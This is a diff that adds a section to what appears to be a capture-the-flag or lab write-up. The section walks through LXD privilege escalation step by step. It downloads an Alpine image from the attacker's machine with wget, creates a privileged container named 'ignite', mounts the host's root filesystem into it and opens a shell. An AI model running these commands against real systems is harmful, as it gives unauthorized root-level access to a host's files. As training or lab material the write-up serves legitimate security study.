@@ -198,3 +198,47 @@ $ git clone https://github.com/saghul/lxd-alpine-builder.git
 $ cd lxd-alpine-builder
 $ python3 -m http.server
 ```
+
+Now I am going to download what I need from attack machine onto the target machine. Here are the command I used:
+
+```bash
+$ wget http://<attack_machine_ip>:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
+```
+
+Now I need to add the image to lxc and give it an alias. I run the following:
+
+```bash
+$ lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
+```
+
+I check to make sure it got added, by running the following command:
+
+```bash
+$ lxc image list
+```
+
+I need to mark that image with privilege escalation. So I create a container called ignite and give it escalated privileges. I run the following:
+
+```bash
+$ lxc init myimage ignite -c security.privileged=true
+```
+
+Now I have a container named ignite. I wasn to mount my hard drive to that container. I name the mount mydevice. Here is the command I ran:
+
+```bash
+$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+```
+
+This means that I can see the target hard drive in the container when I go to the /mnt/root/ directory. In other words, the /mnt/root directory in the container will be the / directory on the target machine.
+
+Now I start the ignite container with the following command:
+
+```bash
+$ lxc start ignite
+```
+
+I log into the machine with a shell using the following command:
+
+```bash
+$ lxc exec ignite /bin/sh
+```
